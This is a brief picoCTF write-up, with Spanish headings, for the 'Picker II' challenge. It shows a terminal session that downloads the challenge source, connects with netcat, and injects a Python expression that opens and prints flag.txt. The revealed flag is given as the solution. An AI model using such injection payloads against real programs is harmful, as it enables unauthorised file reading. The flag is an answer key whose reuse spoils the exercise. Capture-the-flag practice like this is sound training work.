## Introducción
Can you figure out how this program works to get the flag?Connect to the program with netcat:`$ nc saturn.picoctf.net 49844`The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/522/picker-II.py).

1.-Can you do what `win` does with your input to the program?
## Descripción
```
──(kali㉿kali)-[~/p2]
└─$ wget -4 https://artifacts.picoctf.net/c/522/picker-II.py
--2024-11-26 01:24:12--  https://artifacts.picoctf.net/c/522/picker-II.py
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 3.161.55.64, 3.161.55.26, 3.161.55.61, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|3.161.55.64|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3510 (3.4K) [application/octet-stream]
Saving to: ‘picker-II.py’

picker-II.py        100%[==================>]   3.43K  --.-KB/s    in 0s      

2024-11-26 01:24:13 (191 MB/s) - ‘picker-II.py’ saved [3510/3510]

                                                                               
┌──(kali㉿kali)-[~/p2]
└─$ nc saturn.picoctf.net 49844
==> print(open('flag.txt','r').read()) 
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_0b5f1131}
'NoneType' object is not callable
                                                                               
┌──(kali㉿kali)-[~/p2]
└─$ 


```

## Solución 
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_0b5f1131}